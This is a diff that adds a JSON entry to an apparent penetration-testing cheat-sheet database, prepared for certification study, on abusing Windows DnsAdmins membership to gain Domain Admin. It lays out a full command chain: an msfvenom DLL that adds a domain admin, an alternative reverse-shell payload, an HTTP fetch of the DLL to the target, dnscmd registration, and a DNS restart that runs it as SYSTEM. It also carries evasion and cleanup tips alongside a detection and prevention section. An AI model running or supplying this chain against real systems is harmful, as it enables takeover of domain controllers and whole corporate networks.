@@ -1,0 +1,100 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "msfvenom",
+    "dnscmd"
+  ],
+  "tags": [
+    "dnsadmins",
+    "dll",
+    "domain-admin"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - DnsAdmins",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Generate a DLL that adds you to Domain Admins",
+      "command": "msfvenom -p windows/x64/exec cmd='net group \"domain admins\" netadm /add /domain' -f dll -o adduser.dll"
+    },
+    {
+      "label": "Register it as the DNS server-level plugin DLL",
+      "command": "dnscmd.exe /config /serverlevelplugindll C:\\Users\\netadm\\Desktop\\adduser.dll"
+    },
+    {
+      "label": "Restart the DNS service (runs the DLL as SYSTEM)",
+      "command": "sc stop dns && sc start dns"
+    },
+    {
+      "label": "Confirm Domain Admins membership",
+      "command": "net group \"Domain Admins\" /dom"
+    },
+    {
+      "label": "Clean up the ServerLevelPluginDll key",
+      "command": "reg delete ...\\Services\\DNS\\Parameters /v ServerLevelPluginDll"
+    }
+  ],
+  "notes": "=== DnsAdmins — Malicious DLL Loading via DNS Service ===\nDnsAdmins can configure a plugin DLL loaded by the DNS service — runs as SYSTEM on DC.\n\n=== TECHNICAL MECHANISM ===\nWindows DNS service supports loading custom plugin DLLs.\ndnscmd sets: HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ServerLevelPluginDll\nDNS service loads this DLL on next start — runs as NT AUTHORITY\\SYSTEM.\nDNS typically co-located on DC → SYSTEM on DC = Domain Admin equivalent.\n\n=== FULL ATTACK CHAIN ===\nStage 1: Generate DLL payload\n  msfvenom -p windows/x64/exec CMD='net group \"domain admins\" netadm /add /domain' -f dll -o adduser.dll\n  OR: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o rev.dll\n\nStage 2: Deliver DLL to target\n  python3 -m http.server 8080\n  (on target) wget http://<IP>:8080/adduser.dll -O C:\\Windows\\Temp\\adduser.dll\n  Full absolute path REQUIRED — relative paths fail silently\n\nStage 3: Register DLL path (DnsAdmins membership required)\n  dnscmd.exe /config /serverlevelplugindll C:\\Windows\\Temp\\adduser.dll\n  Verify: reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\"\n\nStage 4: Trigger DLL load (requires DNS service restart)\n  Check restart permission: sc.exe sdshow DNS  (look for RPWP bits for your SID)\n  sc stop dns\n  sc start dns\n  (DNS will fail to start — this is EXPECTED, payload runs before timeout)\n\nStage 5: Verify\n  net group \"Domain Admins\" /dom\n\n=== CLEANUP (MANDATORY — DNS OUTAGE RISK) ===\nreg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters /v ServerLevelPluginDll /f\nsc.exe start dns\nDNS OUTAGE affects entire domain — coordinate with client before stopping DNS on production DC\n\n=== CHAINING CONTEXT ===\nDnsAdmins → DLL load → DA group membership → DCSync → golden ticket\nDNS on separate server (not DC) → SYSTEM on DNS server → find other paths to DA\nMimilib.dll alternative → fires on every DNS query → persistent SYSTEM execution\nAfter DA: secretsdump, golden ticket, skeleton key, DCSync\n\n=== WHAT TO LOOK FOR ===\nDnsAdmins membership in ANY non-admin account = critical severity\nDNS service running on DC (default in most environments) = maximum impact\nCannot restart DNS themselves → must wait for natural restart/reboot (still exploitable)",
+  "references": [
+    {
+      "title": "Abusing DnsAdmins (labofapenetrationtester)",
+      "url": "http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "dnsadmins-wpad",
+      "note": "Quieter DnsAdmins abuse via a WPAD record.",
+      "rel": "alternative"
+    },
+    {
+      "id": "certutil-transfer",
+      "note": "Deliver the malicious DLL to the target.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "dnsadmins-dll",
+  "name": "DnsAdmins - Malicious DLL via dnscmd",
+  "command": "dnscmd.exe /config /serverlevelplugindll C:\\path\\adduser.dll",
+  "description": "DnsAdmins can set a custom plugin DLL that the DNS service (running as SYSTEM on a DC) loads on restart. Generate a DLL that adds a domain admin, register it with dnscmd, then restart the DNS service.",
+  "opsec": "loud",
+  "mitre": [
+    "T1574"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Members of the DnsAdmins group can configure the DNS service to load a plugin DLL via `dnscmd /config /serverlevelplugindll`. The DNS service (dns.exe) runs as SYSTEM on Domain Controllers. Loading a malicious DLL into this process provides SYSTEM-level code execution on the DC. The DLL is loaded on the next DNS service restart.",
+    "prerequisites": "Membership in the DnsAdmins group. The malicious DLL must be accessible from the DC (UNC share or local path). Rights to stop and start the DNS service (Server Operators or service-specific ACL).",
+    "impact": "SYSTEM-level code execution on a Domain Controller. Can be used to add accounts to Domain Admins, dump NTDS.dit, or establish persistent backdoors with DC-level access.",
+    "detection": "Event ID 4660 (object deleted) / 4670 (permissions changed) on DNS service registry key. Windows Event ID 7045 (new service installed) if payload deploys a service. DNS server diagnostic log shows plugin DLL path change. Registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ServerLevelPluginDll should be monitored.",
+    "artifacts": "Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ServerLevelPluginDll | DNS server event log: plugin loaded | Process: new DLL loaded into dns.exe | Security event log: dnscmd executed by DnsAdmins member",
+    "prevention": "Audit DnsAdmins membership regularly — treat it as equivalent to Domain Admin. Disable the ServerLevelPluginDll feature via Group Policy if DNS plugins are not used. Restrict DNS service restart rights. Monitor registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters for changes.",
+    "misconfiguration": "Accounts added to DnsAdmins group without understanding the escalation implications. DNS service restart rights granted to DnsAdmins members. No monitoring on DNS service registry parameters.",
+    "vulnerable_config": "# User in DnsAdmins group\nGet-ADGroupMember -Identity DnsAdmins\n# netadm is a member\n\n# Attacker sets plugin DLL:\ndnscmd.exe /config /serverlevelplugindll \\\\attacker\\share\\adduser.dll\nsc stop dns && sc start dns  # loads malicious DLL as SYSTEM",
+    "secure_config": "# Audit DnsAdmins group\nGet-ADGroupMember -Identity DnsAdmins\n\n# Remove unnecessary members\nRemove-ADGroupMember -Identity DnsAdmins -Members netadm\n\n# Monitor registry (GPO audit)\n# Audit HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\n# Alert: ServerLevelPluginDll value creation/modification",
+    "evasion": "Use a UNC path to a controlled share for the DLL so no file is dropped on the DC. After DLL loads and payload executes, remove the registry key to reduce persistence artifacts.",
+    "sources": [
+      "HTB M26",
+      "MITRE T1543.003",
+      "MITRE T1574.002"
+    ]
+  }
+}
